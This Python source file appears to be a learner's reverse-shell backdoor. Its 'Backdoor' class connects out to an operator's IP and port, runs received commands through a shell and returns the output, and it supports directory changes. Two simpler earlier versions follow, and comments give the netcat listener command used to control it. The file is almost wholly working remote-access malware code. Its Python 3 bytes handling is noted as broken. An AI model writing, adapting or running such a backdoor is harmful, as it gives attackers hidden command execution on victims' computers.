#!/usr/bin/env python
#needs debugging to work in python3 - bytes-like object error

import json, os, socket, subprocess

#to open listening connection on target computer using netcat:
#nc -vv -l -p 4444
#netcat --veryverbose -listen -port ####

class Backdoor:
    def __init__ (self, ip, port): #constructor method
        self.connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
        self.connection.connect((ip, port)) #connect method from connection variable
        
    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path
        
    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)
    
    def reliable_receive(self):
        json_data = ""
        while True: #loop to execute until entire stream of data is received
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data) #attempt to unpack json converted TCP stream
            except ValueError: #ValueError unterminated string will be received if entire data set is not received
                continue
    
    def reliable_send(self, data):
        #seralise data being sent in order to make sure
        #data arrives intact and pipe doesn't break
        json_data = json.dumps(data) #dumps - method to convert to json object
        self.connection.send(json_data)
    
    def run(self):
        while True:
            #command = self.connection.recv(1024) #receive, specify buffer size
            command = self.reliable_receive() #receive, specify buffer size
            if command[0] == "exit": #if first element of new command list contains exit (did user type exit)
                #this works because data is sent as json object and unpacked first; receives var command as list
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            else:
                command_result = self.execute_system_command(command) #specify SELF.function -
                #need to specify self since calling function from within class
                #self.connection.send(command_result)
            self.reliable_send(command_result)
    
ip = raw_input("Enter IP Address: ")
port = int(raw_input("Enter port number to use: "))
buffer_size = int(raw_input("Enter buffer size: "))

my_backdoor = Backdoor(ip, port)
my_backdoor.run()





#connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string
############################################################################
############################################################################
###Commented code below###
#!/usr/bin/env python

import socket, subprocess

#to open listening connection on target computer using netcat:
#nc -vv -l -p 4444
#netcat --veryverbose -listen -port ####

def execute_system_command(command):
    return subprocess.check_output(command, shell=True) #system command is a shell not a list so shell needs to be set to true
    #subprocess.check_output returns result, need to either store it as a var or return it
    
#python3:
#ip = input("Enter IP Address: ")
#port = input("Enter port number to use: ")
#buffer_size = input("Enter buffer size: ")

ip = raw_input("Enter IP Address: ")
port = int(raw_input("Enter port number to use: "))
buffer_size = int(raw_input("Enter buffer size: "))

connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
#takes two args - 1 - address family, 2 - socket type

connection.connect((ip, port)) #connect method from connection variable
connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string

while True:
    command = connection.recv(buffer_size) #receive, specify buffer size
    command_result = execute_system_command(command)
    connection.send(command_result)
connection.close()
#connect method takes a tuple
#takes IP and port arguments
#create socket connection from host to target IP and port



#!/usr/bin/env python3

import socket

connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
#takes two args - 1 - address family, 2 - socket type

ip = input("Enter IP Address: ")
port = input("Enter port number to use: ")
buffersize = input("Enter buffer size: ")

connection.connect((ip, port)) #connect method from connection variable
connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string
received_data = connection.recv(buffersize) #receive, specify buffer size
print(received_data)
connection.close()
#connect method takes a tuple
#takes IP and port arguments
#create socket connection from host to target IP and port
